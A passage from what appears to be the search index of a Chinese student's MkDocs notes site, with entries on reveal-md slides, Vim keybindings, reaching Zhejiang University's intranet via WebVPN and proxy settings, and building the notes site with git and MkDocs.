\u5219\u4f7f\u5f97\u8fd9\u4e00\u6548\u679c\u80fd\u5145\u5206\u901a\u8fc7 <code>Markdown files</code> \u5b9e\u73b0</p> <p>\u4f60\u53ef\u4ee5\u901a\u8fc7 github-pages \u7b49\u7f51\u9875\u6258\u7ba1\u5e73\u53f0\u5c06\u5176\u90e8\u7f72\u4e3a\u9759\u6001\u9875\u9762\u5e76\u5206\u4eab</p> <p><code>reveal-md</code>\u00a0\u7684 github repo</p>"},{"location":"Techniques/Reveal-md/#_2","title":"\u4f7f\u7528","text":"<p>\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u5b89\u88c5 <code>reveal-md</code> \uff1a</p> <pre><code>npm install -g reveal-md\n</code></pre> <p>\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>reveal-md --help</code> \u6765\u67e5\u770b\u5e2e\u52a9</p> <p>\u57fa\u7840\u547d\u4ee4\uff1a</p> <pre><code>## \u6700\u57fa\u7840\u7684\u547d\u4ee4\uff0c\u6839\u636e Markdown \u6587\u4ef6\u5728\u672c\u5730 1948 \u7aef\u53e3\u751f\u6210 Slides \u670d\u52a1\u3002\n&gt; reveal-md your-md-file.md (-w)\n## \u52a0\u4e0a-w\u53c2\u6570\uff0c\u53ef\u4ee5\u5b9e\u73b0\u81ea\u52a8\u5237\u65b0\u9875\u9762\u5185\u5bb9\uff0c\u65b9\u4fbf\u4fee\u6539\n\n## \u4e3a\u4e86\u5b9e\u73b0\u5728\u7ebf\u90e8\u7f72\uff0c\u9700\u8981\u5bfc\u51fa\u4e3a\u9759\u6001\u8d44\u6e90\u3002\n&gt; reveal-md your-md-file.md --static your-static-dir\n</code></pre> <p>\u5e38\u7528\u6309\u952e\uff1a</p> <ul> <li><code>f</code> \u5168\u5c4f</li> <li><code>o</code> \u603b\u89c8</li> <li><code>s</code> \u8fdb\u5165\u6f14\u8bb2\u8005\u6a21\u5f0f</li> <li><code>v</code> \u9ed1\u5c4f</li> </ul>"},{"location":"Techniques/Reveal-md/#md","title":"MD \u8bed\u6cd5","text":""},{"location":"Techniques/Reveal-md/#_3","title":"\u5206\u9875","text":"<p>\u4f7f\u7528 Markdown \u7684\u5206\u9694\u7b26\u6765\u5206\u79bb Slides\uff1a</p> <ul> <li><code>\\n---\\n</code> \u5de6\u53f3\u5206\u9875</li> <li><code>\\n----\\n</code> \u4e0a\u4e0b\u5206\u9875</li> </ul> <pre><code># Title\n\n- Point 1\n- Point 2\n\n---\n\n## Second slide\n\n&gt; Best quote ever.\n\nNote: speaker notes FTW!\n</code></pre>"},{"location":"Techniques/Reveal-md/#_4","title":"\u4ee3\u7801\u6bb5","text":"<p>\u9ad8\u4eae\u67d0\u4e9b\u884c\uff1a</p> <pre><code>```python [1|3-6]\nn = 0\nwhile n &lt; 10:\n  if n % 2 == 0:\n    print(f\"{n} is even\")\n  else:\n    print(f\"{n} is odd\")\n  n += 1\n\\``` # \u8fd9\u91cc\u5b9e\u9645\u4e0a\u662f ``` \n</code></pre> <p>\u4f7f\u7528 <code>|</code> \u6765\u5206\u9694\u9ad8\u4eae\u5757\uff0c\u5982\u4e0a\u8ff0\u4f8b\u5b50\u5c31\u662f\u5148\u9ad8\u4eae <code>n = 0</code> \uff0c\u518d\u9ad8\u4eae <code>while</code> \u51fd\u6570\u5185\u90e8</p>"},{"location":"Techniques/Reveal-md/#_5","title":"\u98ce\u683c\u8c03\u6574","text":"<p>\u4e0e Mkdocs \u8c03\u6574\u7c7b\u4f3c\uff0c\u9700\u8981\u81ea\u5df1\u5199\u4e00\u4efd CSS \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\u7f8e\u5316</p> <p>\u901a\u8fc7\u6d4f\u89c8\u5668\u7684<code>\u68c0\u67e5</code>\u6309\u94ae\u67e5\u770b\u5c5e\u6027</p> <p>\u7531\u4e8e\u6211\u7684\u5b9a\u5236\u57fa\u672c\u90fd\u662f\u4ece\u522b\u4eba\u90a3\u91cc\u6284\u8fc7\u6765\u7684\uff0c\u5c31\u4e0d\u5728\u8fd9\u91cc\u653e\u51fa\u4e86</p>"},{"location":"Techniques/Reveal-md/#pdf","title":"\u6253\u5370\u4e3a pdf \u683c\u5f0f","text":"<pre><code># in pixels when no unit is given\nreveal-md slides.md --print slides.pdf --print-size 1024x768\n\n# valid units are: px, in, cm, mm\nreveal-md slides.md --print slides.pdf --print-size 210x297mm\n\n# valid formats are: A0-6, Letter, Legal, Tabloid, Ledger\nreveal-md slides.md --print slides.pdf --print-size A4\n</code></pre>"},{"location":"Techniques/Reveal-md/#github-pages","title":"\u90e8\u7f72\u5230 Github Pages \u4e0a","text":"<p>\u7531\u4e8e\u9ed8\u8ba4\u751f\u6210\u7684 css \u6587\u4ef6\u5939\u540d\u5b57\u662f <code>_assests</code> \uff0c\u4f46\u662f <code>_assests</code> \u4f1a\u88ab Github Pages \u5ffd\u7565\uff0c\u6240\u4ee5\u6211\u4eec\u751f\u6210\u9759\u6001\u9875\u9762\u7684\u65f6\u5019\u9700\u8981\u6307\u5b9a assests \u7684\u540d\u5b57</p> <pre><code>reveal-md .\\test.md --static static-dir --assets-dir assets\n</code></pre> <p>\u90e8\u7f72\u5b8c\u540e\uff0c\u901a\u8fc7 URL \u6307\u5b9a\u8bbf\u95ee\u5373\u53ef</p> <p>\u6709\u65f6\u5019\u8868\u683c\u6e32\u67d3\u4e0d\u51fa\u6765\uff0c\u8fd8\u6ca1\u641e\u61c2</p> <p>\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u4e00\u4e0b\u5c06 mkdocs \u548c reveal-md \u7ed3\u5408\u7684 mkslides\uff0c\u4e0d\u8fc7\u76ee\u524d\u7981\u7528\u4e86\u6f14\u8bb2\u8005\u6a21\u5f0f\uff0c\u6211\u6682\u65f6\u4e0d\u60f3\u7528\u3002</p>"},{"location":"Techniques/VIM/","title":"VIM","text":"<p> \u7ea6 758 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"},{"location":"Techniques/VIM/#usage","title":"Usage","text":"\u6309\u952e \u529f\u80fd\u63cf\u8ff0 <code>i</code> \u5207\u6362\u5230\u8f93\u5165\u6a21\u5f0f\uff0c\u5728\u5149\u6807\u5f53\u524d\u4f4d\u7f6e\u5f00\u59cb\u8f93\u5165\u6587\u672c\u3002 <code>x</code> \u5220\u9664\u5f53\u524d\u5149\u6807\u6240\u5728\u5904\u7684\u5b57\u7b26\u3002 <code>:</code> \u5207\u6362\u5230\u5e95\u7ebf\u547d\u4ee4\u6a21\u5f0f\uff0c\u4ee5\u5728\u6700\u5e95\u4e00\u884c\u8f93\u5165\u547d\u4ee4\u3002 <code>a</code> \u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\uff0c\u5728\u5149\u6807\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u8f93\u5165\u6587\u672c\u3002 <code>o</code> \u5728\u5f53\u524d\u884c\u7684\u4e0b\u65b9\u63d2\u5165\u4e00\u4e2a\u65b0\u884c\uff0c\u5e76\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\u3002 <code>O</code> \u5728\u5f53\u524d\u884c\u7684\u4e0a\u65b9\u63d2\u5165\u4e00\u4e2a\u65b0\u884c\uff0c\u5e76\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\u3002 <code>dd</code> \u526a\u5207\u5f53\u524d\u884c\u3002 <code>yy</code> \u590d\u5236\u5f53\u524d\u884c\u3002 <code>p</code> \u7c98\u8d34\u526a\u8d34\u677f\u5185\u5bb9\u5230\u5149\u6807\u4e0b\u65b9\u3002 <code>P</code> \u7c98\u8d34\u526a\u8d34\u677f\u5185\u5bb9\u5230\u5149\u6807\u4e0a\u65b9\u3002 <code>u</code> \u64a4\u9500\u4e0a\u4e00\u6b21\u64cd\u4f5c\u3002 <code>Ctrl + r</code> \u91cd\u505a\u4e0a\u4e00\u6b21\u64a4\u9500\u7684\u64cd\u4f5c\u3002 <code>:w</code> \u4fdd\u5b58\u6587\u4ef6\u3002 <code>:q</code> \u9000\u51fa Vim \u7f16\u8f91\u5668\u3002 <code>:q!</code> \u5f3a\u5236\u9000\u51fa Vim \u7f16\u8f91\u5668\uff0c\u4e0d\u4fdd\u5b58\u4fee\u6539\u3002 <code>:wq</code> \u4fdd\u5b58\u5e76\u9000\u51fa <p>\u8fd8\u6709\u4e00\u4e9b\u5e38\u7528\u7684\u5149\u6807\u79fb\u52a8\u6309\u952e\uff1a</p> \u6309\u952e \u529f\u80fd\u63cf\u8ff0 h \u6216 \u5411\u5de6\u7bad\u5934\u952e(\u2190) \u5149\u6807\u5411\u5de6\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 j \u6216 \u5411\u4e0b\u7bad\u5934\u952e(\u2193) \u5149\u6807\u5411\u4e0b\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 k \u6216 \u5411\u4e0a\u7bad\u5934\u952e(\u2191) \u5149\u6807\u5411\u4e0a\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 l \u6216 \u5411\u53f3\u7bad\u5934\u952e(\u2192) \u5149\u6807\u5411\u53f3\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 [Ctrl] + [f] \u5c4f\u5e55\u300e\u5411\u4e0b\u300f\u79fb\u52a8\u4e00\u9875\uff0c\u76f8\u5f53\u4e8e [Page Down]\u6309\u952e (\u5e38\u7528) [Ctrl] + [b] \u5c4f\u5e55\u300e\u5411\u4e0a\u300f\u79fb\u52a8\u4e00\u9875\uff0c\u76f8\u5f53\u4e8e [Page Up] \u6309\u952e (\u5e38\u7528) n\\ \u90a3\u4e2a n \u8868\u793a\u300e\u6570\u5b57\u300f\uff0c\u4f8b\u5982 20 \u3002\u6309\u4e0b\u6570\u5b57\u540e\u518d\u6309\u7a7a\u683c\u952e\uff0c\u5149\u6807\u4f1a\u5411\u53f3\u79fb\u52a8\u8fd9\u4e00\u884c\u7684 n \u4e2a\u5b57\u7b26\u3002\u4f8b\u5982 20 \u5219\u5149\u6807\u4f1a\u5411\u540e\u9762\u79fb\u52a8 20 \u4e2a\u5b57\u7b26\u8ddd\u79bb\u3002 0 \u8fd9\u662f\u6570\u5b57\u300e 0 \u300f\uff1a\u79fb\u52a8\u5230\u8fd9\u4e00\u884c\u7684\u6700\u524d\u9762\u5b57\u7b26\u5904 (\u5e38\u7528) $ \u79fb\u52a8\u5230\u8fd9\u4e00\u884c\u7684\u6700\u540e\u9762\u5b57\u7b26\u5904(\u5e38\u7528) G \u79fb\u52a8\u5230\u8fd9\u4e2a\u6863\u6848\u7684\u6700\u540e\u4e00\u884c(\u5e38\u7528) nG n \u4e3a\u6570\u5b57\u3002\u79fb\u52a8\u5230\u8fd9\u4e2a\u6863\u6848\u7684\u7b2c n \u884c\u3002\u4f8b\u5982 20G \u5219\u4f1a\u79fb\u52a8\u5230\u8fd9\u4e2a\u6863\u6848\u7684\u7b2c 20 \u884c(\u53ef\u914d\u5408 :set nu) gg \u79fb\u52a8\u5230\u8fd9\u4e2a\u6863\u6848\u7684\u7b2c\u4e00\u884c\uff0c\u76f8\u5f53\u4e8e 1G \u554a\uff01 (\u5e38\u7528) n n \u4e3a\u6570\u5b57\u3002\u5149\u6807\u5411\u4e0b\u79fb\u52a8 n \u884c(\u5e38\u7528) <p>\u641c\u7d22\u7528\uff1a</p> \u6309\u952e \u529f\u80fd\u63cf\u8ff0 word \u5411\u5149\u6807\u4e4b\u4e0b\u5bfb\u627e\u4e00\u4e2a\u540d\u79f0\u4e3a word \u7684\u5b57\u7b26\u4e32\u3002\u4f8b\u5982\u8981\u5728\u6863\u6848\u5185\u641c\u5bfb vbird \u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u5c31\u8f93\u5165 /vbird \u5373\u53ef\uff01 (\u5e38\u7528) ?word \u5411\u5149\u6807\u4e4b\u4e0a\u5bfb\u627e\u4e00\u4e2a\u5b57\u7b26\u4e32\u540d\u79f0\u4e3a word \u7684\u5b57\u7b26\u4e32\u3002 n \u8fd9\u4e2a n \u662f\u82f1\u6587\u6309\u952e\u3002\u4ee3\u8868\u91cd\u590d\u524d\u4e00\u4e2a\u641c\u5bfb\u7684\u52a8\u4f5c\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c \u5982\u679c\u521a\u521a\u6211\u4eec\u6267\u884c /vbird \u53bb\u5411\u4e0b\u641c\u5bfb vbird \u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u5219\u6309\u4e0b n \u540e\uff0c\u4f1a\u5411\u4e0b\u7ee7\u7eed\u641c\u5bfb\u4e0b\u4e00\u4e2a\u540d\u79f0\u4e3a vbird \u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u662f\u6267\u884c ?vbird \u7684\u8bdd\uff0c\u90a3\u4e48\u6309\u4e0b n \u5219\u4f1a\u5411\u4e0a\u7ee7\u7eed\u641c\u5bfb\u540d\u79f0\u4e3a vbird \u7684\u5b57\u7b26\u4e32\uff01 N \u8fd9\u4e2a N \u662f\u82f1\u6587\u6309\u952e\u3002\u4e0e n \u521a\u597d\u76f8\u53cd\uff0c\u4e3a\u300e\u53cd\u5411\u300f\u8fdb\u884c\u524d\u4e00\u4e2a\u641c\u5bfb\u52a8\u4f5c\u3002 \u4f8b\u5982 /vbird \u540e\uff0c\u6309\u4e0b N \u5219\u8868\u793a\u300e\u5411\u4e0a\u300f\u641c\u5bfb vbird \u3002 <p>\u4f7f\u7528 /word \u914d\u5408 n \u53ca N \u662f\u975e\u5e38\u6709\u5e2e\u52a9\u7684\uff01\u53ef\u4ee5\u8ba9\u4f60\u91cd\u590d\u7684\u627e\u5230\u4e00\u4e9b\u4f60\u641c\u5bfb\u7684\u5173\u952e\u8bcd\uff01</p>"},{"location":"Techniques/ZJU%20%E6%A0%A1%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5/","title":"ZJU \u6821\u5185\u7f51\u8fde\u63a5","text":"<p> \u7ea6 216 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Techniques/ZJU%20%E6%A0%A1%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5/#webvpn","title":"WebVPN","text":"<p>\u4efb\u4f55\u6821\u5185\u7f51\u7ad9\u7684\u8bbf\u95ee\u90fd\u53ef\u4ee5\u901a\u8fc7 WebVPN \u5b9e\u73b0\uff1a https://webvpn.zju.edu.cn/</p> <p>\u5176\u94fe\u63a5\u89c4\u5219\u5982\u4e0b\uff1a</p> <ul> <li>\u53ea\u6709\u00a0HTTP\u00a0\u534f\u8bae\uff0c\u4e0d\u652f\u6301\u00a0HTTPS</li> <li>\u90fd\u901a\u8fc7\u00a0<code>.webvpn.zju.edu.cn:8001</code>\u00a0\u8bbf\u95ee</li> <li>\u56db\u7ea7\u57df\u540d\u7684\u89c4\u5219\u4e3a\uff1a<ul> <li>\u539f\u57df\u540d\u7684\u00a0<code>.</code>\u00a0\u66ff\u6362\u4e3a\u00a0<code>-</code>\uff0c<code>-</code>\u00a0\u66ff\u6362\u4e3a\u00a0<code>--</code></li> <li>\u5982\u679c\u8981\u901a\u8fc7\u00a0HTTPS\u00a0\u8bbf\u95ee\uff0c\u5219\u5728\u672b\u5c3e\u52a0\u00a0<code>-s</code></li> </ul> </li> <li>URL\u00a0\u8d44\u6e90\u8def\u5f84\u76f4\u63a5\u63a5\u5728\u94fe\u63a5\u540e\u9762</li> <li>\u53ef\u89c1\u00a0ip\u00a0\u7684\u00a0<code>.</code>\u00a0\u4ee5\u53ca\u00a0ip\u00a0\u548c\u7aef\u53e3\u95f4\u7684\u00a0<code>:</code>\u00a0\u90fd\u66ff\u6362\u4e3a\u4e86\u00a0<code>-</code>\u00a0\u5e76\u5728\u7ed3\u5c3e\u52a0\u4e86\u00a0<code>-p</code></li> </ul> <p>\u4f8b\u5982\uff1a</p> <ul> <li>\u901a\u8fc7\u94fe\u63a5 http://www-cc98-org-s.webvpn.zju.edu.cn:8001/ \u6821\u5916\u8bbf\u95ee\u8bba\u575b cc98 </li> <li>\u4e00\u4e2a\u6821\u5185 CTF \u9898\u76ee\u90e8\u7f72\u5728 http://10.214.160.13:10002/ \uff0c\u6821\u5916\u53ef\u4ee5\u901a\u8fc7 http://10-214-160-13-10002-p.webvpn.zju.edu.cn:8001/ \u8fdb\u884c\u8bbf\u95ee</li> </ul>"},{"location":"Techniques/ZJU%20%E6%A0%A1%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5/#_1","title":"\u4ee3\u7406","text":""},{"location":"Techniques/ZJU%20%E6%A0%A1%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5/#easyconnect","title":"EasyConnect","text":"<p>\u5373 RVPN \uff0c\u7f51\u5740\u4e3a https://rvpn.zju.edu.cn/ </p>"},{"location":"Techniques/ZJU%20%E6%A0%A1%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5/#zju-connect","title":"ZJU-Connect","text":"<p>\u5e94\u8be5\u662f\u4e00\u4e2a\u5b66\u957f\u5199\u7684\u8f6f\u4ef6</p>"},{"location":"Techniques/ZJU%20%E6%A0%A1%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5/#_2","title":"\u79d1\u5b66\u4e0a\u7f51\u7684\u540c\u65f6\u8fdb\u5185\u7f51","text":"<p>\u5728 clash \u7684 bypass domain \u91cc\u5199\u5165\uff1a</p> <pre><code>bypass:\n  - localhost\n  - 127.*\n  - 10.*\n  - 172.16.*\n  - 172.17.*\n  - 172.18.*\n  - 172.19.*\n  - 172.20.*\n  - 172.21.*\n  - 172.22.*\n  - 172.23.*\n  - 172.24.*\n  - 172.25.*\n  - 172.26.*\n  - 172.27.*\n  - 172.28.*\n  - 172.29.*\n  - 172.30.*\n  - 172.31.*\n  - 192.168.*\n  - \"*cc98.org*\"\n  - &lt;local&gt;\n  - \"*westlake.edu.cn*\"\n  - \"*zju.edu.cn*\"\n  - \"*sciencedirect.com*\"\n  - \"*springer.com*\"\n  - \"*wiley.com*\"\n  - \"*elsevier.com*\"\n  - \"*pubmed.gov*\"\n  - \"*jstor.org*\"\n  - \"*plos.org*\"\n  - \"*sagepub.com*\"\n  - \"*sciencemag.org*\"\n  - \"*science.org*\"\n  - \"*nature.com*\"\n  - \"*aps.org*\"\n  - \"*acm.org*\"\n  - \"*cell.com*\"\n  - \"*ieee.org*\"\n  - \"*academic.oup.com*\"\n  - \"*cambridge.org*\"\n  - \"*rsc.org*\"\n  - \"*annualreviews.org*\"\n  - \"*acs.org*\"\n  - \"*pnas.org*\"\n  - \"*sciencedirectassets.com*\"\n  - \"*doi.org*\"\n  - \"*aip.org*\"\n  - \"*141.66.193.6*\"\n  - \"*webofscience*\"\n</code></pre>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/","title":"\u5efa\u7acb\u5728\u7ebf\u7b14\u8bb0","text":""},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#_1","title":"\u5efa\u7ad9\u76f8\u5173","text":"<p> \u7ea6 917 \u4e2a\u5b57  35 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>\u7531\u4e8e\u6211\u66f4\u591a\u9700\u8981\u7684\u662f\u4e00\u4e2a\u53ef\u4ee5\u4f9b\u6211\u968f\u65f6\u968f\u5730\u6253\u5f00\u7684\u7b14\u8bb0\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u535a\u5ba2\u6027\u8d28\u7684\u7f51\u7ad9\uff0c\u56e0\u6b64\u6211\u6700\u7ec8\u9009\u62e9\u4e86mkdocs\u4f5c\u4e3a\u6a21\u677f\u90e8\u7f72\u6211\u7684\u7f51\u7ad9\u3002</p>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#_2","title":"\u8ba4\u771f\u9605\u8bfb\u6b64\u6587\u6863\uff0c\u76f8\u4fe1\u4f60\u80fd\u6210\u529f","text":"<p>jobindjohn/obsidian-publish-mkdocs: A Template to Publish Obsidian/Foam Notes on Github Pages (uses MkDocs)</p> <ul> <li>\u5176\u5b83\u5b98\u65b9\u6587\u6863<ul> <li>MkDocs</li> <li>Material for MkDocs</li> </ul> </li> </ul> <p>\u6700\u597d\u8fd8\u662f\u628a\u8fd9\u4e9b\u5f04\u597d\uff0c\u4ee5\u4fbf\u53ef\u4ee5\u5b9e\u73b0\u672c\u5730\u8c03\u8bd5</p>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#git","title":"\u5173\u4e8egit\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c","text":"<pre><code>\u5207\u6362\u5206\u652f\u547d\u4ee4:\ngit checkout main\n</code></pre> <p>\u5f53\u4f60\u4fee\u6539\u4e86\u4ed3\u5e93\u540e\uff0c\u8bf7\u6267\u884c\u4ee5\u4e0b\u4e09\u4e2a\u547d\u4ee4\u6765\u63d0\u4ea4\u4fee\u6539 \u6ce8\u610f\uff0c\u4e0d\u7528\u5207\u6362\u5230<code>gh-pages</code>\u5206\u652f\uff0c\u5728main\u5206\u652fpush\u5c31\u597d\u4e86 </p><pre><code>git add .\ngit commit -m \"The information you note\"\ngit push\n</code></pre> <p>\u5982\u679c\u4f60commit\u9519\u4e86\uff0c\u8bf7reset\u53d6\u6d88commit </p><pre><code>git reset HEAD~1\n</code></pre> <p>\u5982\u679cpush\u7684\u65f6\u5019\u62a5\u9519\u4e86\u53ef\u4ee5\u5c1d\u8bd5\u53d6\u6d88\u4ee3\u7406 </p><pre><code>//\u53d6\u6d88http\u4ee3\u7406\ngit config --global --unset http.proxy\n//\u53d6\u6d88https\u4ee3\u7406 \ngit config --global --unset https.proxy\n</code></pre> <p>\u4e00\u822c\u4f7f\u7528\u4e86\u5982\u4e0a\u64cd\u4f5c\u90fd\u4f1a\u6210\u529f\uff0c\u5982\u679c\u8fd8\u662f\u4e0d\u884c\uff0c\u8bf7\u6253\u5f00\u8bbe\u7f6e\u4e2d\u7684\u7f51\u7edc\u4e0eInternet\uff0c\u9009\u62e9\u4ee3\u7406\uff0c\u624b\u52a8\u8bbe\u7f6e\u4ee3\u7406\uff0c\u5c06\u7aef\u53e3\u6539\u4e3a7890\u3002  \u7136\u540e\u5728git bash\u4e2d\u8f93\u5165 </p><pre><code>git config --global http.proxy http://127.0.0.1:7890\n</code></pre> <p>Danger</p> <p>\u6b64\u5904\u56e0\u4e2a\u4eba\u4fe1\u606f\u5220\u9664\u4e86\u6dfb\u52a0\u57df\u540d\u7684\u6559\u7a0b\uff0c\u5982\u679c\u6709\u95f2\u60c5\u641e\u8fd9\u4e2a\u6211\u4f1a\u8865\u5145\u56de\u6765</p>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#_3","title":"\u672c\u5730\u670d\u52a1\u5668","text":"<p>\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u6bcf\u6b21\u505a\u4e00\u4e9b\u5c0f\u5c0f\u7684\u8c03\u8bd5\u5c31push\u5230\u4ed3\u5e93\u4e2d\u518d\u6253\u5f00\u7f51\u7ad9\u770b\u662f\u5426\u6210\u529f\uff0c\u4f60\u5e94\u8be5\u5148\u628amkdocs\u5b89\u88c5\u597d\uff0c\u5e76\u5728\u4f60\u7684\u7535\u8111\u4e0a\u628a\u4f7f\u7528\u5230\u7684\u63d2\u4ef6\u90fd\u5b89\u88c5\u4e0a\uff0c\u518d\u5728<code>mkdocs.yml</code>\u6240\u5728\u76ee\u5f55\u8fd0\u884c\u4e0b\u5217\u547d\u4ee4\u542f\u52a8\u672c\u5730\u670d\u52a1\u5668\u3002 </p><pre><code>mkdocs serve\n</code></pre> \u5982\u679c\u4e0a\u9762\u8fd9\u4e2a\u8fd0\u884c\u4e0d\u4e86\uff0c\u8bf7\u5728\u524d\u9762\u52a0\u4e0a<code>python -m</code> <pre><code>python -m mkdocs serve\n</code></pre> <p>\u6709\u65f6\u5019\uff0c\u5728\u521b\u5efa\u672c\u5730\u670d\u52a1\u5668\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u9047\u5230<code>PermissionError: [WinError 10013] \u4ee5\u4e00\u79cd\u8bbf\u95ee\u6743\u9650\u4e0d\u5141\u8bb8\u7684\u65b9\u5f0f\u505a\u4e86\u4e00\u4e2a\u8bbf\u95ee\u5957\u63a5\u5b57\u7684\u5c1d\u8bd5\u3002</code>\u7684\u63d0\u793a\uff0c\u8fd9\u544a\u8bc9\u6211\u4eec\u7aef\u53e3\u5df2\u7ecf\u88ab\u5360\u7528\u4e86\u3002 \u5982\u679c\u4f60\u5f00\u7740\u9177\u72d7\u97f3\u4e50\uff0c\u8bf7\u5c06\u5b83\u5173\u95ed\u540e\u91cd\u8bd5\uff0c\u56e0\u4e3a\u9177\u72d7\u9ed8\u8ba4\u7aef\u53e3\u5c31\u662f8000\ud83e\udd23 \u5982\u679c\u6ca1\u6709\uff0c\u53ef\u4ee5\u5c1d\u8bd5: </p><pre><code>netstat -ano|findstr 8000\n</code></pre> \u6765\u627e\u5230\u5360\u7528\u7aef\u53e3\u7684PID\uff0c\u518dtaskill\u5b83\u6765\u5173\u95ed <pre><code>taskkill /pid THEPIDYOUFIND /F\n</code></pre>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#_4","title":"\u6dfb\u52a0\u5b57\u6570\u7edf\u8ba1","text":"<p>\u53c2\u7167\u9e64\u7fd4\u4e07\u91cc\u5927\u795e\u7684readme\u6587\u6863\u5b89\u88c5\u63d2\u4ef6</p> <p>\u5982\u679c\u4f60\u548c\u6211\u4e00\u6837\uff0c\u662f\u5728workflow\u4e2d\u5b89\u88c5\u7684\uff0c\u8bf7\u5728workflow\u7684<code>ci.yml</code>\u6587\u4ef6\u4e2d\u52a0\u5165: </p><pre><code>\u00a0run: pip install mkdocs-statistics-plugin\n</code></pre> \u5b9e\u73b0\u6bcf\u6b21push\u5b8c\u90fd\u80fd\u591f\u6b63\u786e\u542f\u7528\u8fd9\u4e2a\u63d2\u4ef6 <p>\u5728\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4e5f\u906d\u9047\u4e86html\u4e2d\u7684icon\u663e\u793a\u4e0d\u51fa\u6765\u7684\u60c5\u51b5\uff0c\u67e5\u9605\u4e86mkdocs-material\u4f7f\u7528\u6587\u6863\u540e\uff0c\u6211\u53d1\u73b0\u9700\u8981\u5728markdown_extensions\u4e2d\u6dfb\u52a0: </p><pre><code>markdown_extensions:\n    - md_in_html\n    - pymdownx.emoji:\n            emoji_index: !!python/name:material.extensions.emoji.twemoji\n            emoji_generator: !!python/name:material.extensions.emoji.to_svg\n</code></pre>"},{"location":"Techniques/%E5%BB%BA%E7%AB%8B%E5%9C%A8%E7%BA%BF%E7%AC%94%E8%AE%B0/#js","title":"\u6dfb\u52a0js\u80cc\u666f\u7c92\u5b50\u6548\u679c","text":"<ul> <li>https://github.com/VincentGarreau/particles.js/</li> </ul> <p>\u4e0b\u8f7d <code>app.js</code>, <code>particles.js</code> \u3002\u5728 https://vincentgarreau.com/particles.js/#nasa \u9875\u9762\u53ef\u4ee5\u5bf9\u7c92\u5b50\u6548\u679c\u8fdb\u884c\u8c03\u6574\uff0c\u8c03\u6574\u5b8c\u540e\u5c06 json \u5185\u5bb9\u590d\u5236\u5230 <code>app.js</code> \u4e2d\u3002</p> <p>mkdocs \u652f\u6301\u4e3b\u9898\u5757\u8986\u5199\uff0c\u6211\u4eec\u5728\u6839\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a <code>custom</code> \u6587\u4ef6\u5939\uff0c\u65b0\u5efa\u4e00\u4e2a\u540d\u4e3a <code>main.html</code> \u7684\u6587\u4ef6</p> <p>\u6587\u4ef6\u547d\u540d\u5fc5\u987b\u8981\u8ddf\u4e3b\u9898\u683c\u5f0f\u5bf9\u9f50\uff0c\u4e00\u822c\u6765\u8bb2\u8986\u5199 <code>main.html</code> \u5c31\u53ef\u4ee5\u4e86</p> <p>\u7531\u4e8e\u6211\u4eec\u5e0c\u671b\u5728\u6240\u6709\u7f51\u9875\u7684 <code>body</code> \u5757\u4e2d\u90fd\u63d2\u5165 <code>&lt;div id=\"particles-js\"&gt;&lt;/div&gt;</code> \uff0c\u6211\u4eec\u627e\u4e00\u4e2a\u4f4d\u4e8e <code>body</code> \u4e2d\u3001\u4e14\u6ca1\u6709\u7528\u5904\u7684 Block \u8fdb\u884c\u8986\u76d6\uff0c\u6b64\u5904\u6211\u9009\u62e9\u7684\u662f <code>hero</code> \u5757\uff0c\u5176\u5728 material for mkdocs \u4e2d\u4f3c\u4e4e\u662f\u7528\u4f5c\u516c\u544a\u7684\u7528\u9014\u3002</p> <pre><code>{% extends \"base.html\" %}\n\n{% block hero %}\n\n{{ super() }}\n\n&lt;style type=\"text/css\"&gt;\n  #particles-js {\n  width: 100%;\n  height: 100%;\n  position: fixed;\n  left: 0;\n  right: 0;\n  top: 0;\n  bottom: 0;\n  z-index: -1;\n}\n&lt;/style&gt;\n&lt;div id=\"particles-js\"&gt;&lt;/div&gt;\n&lt;script src=\"{{ base_url 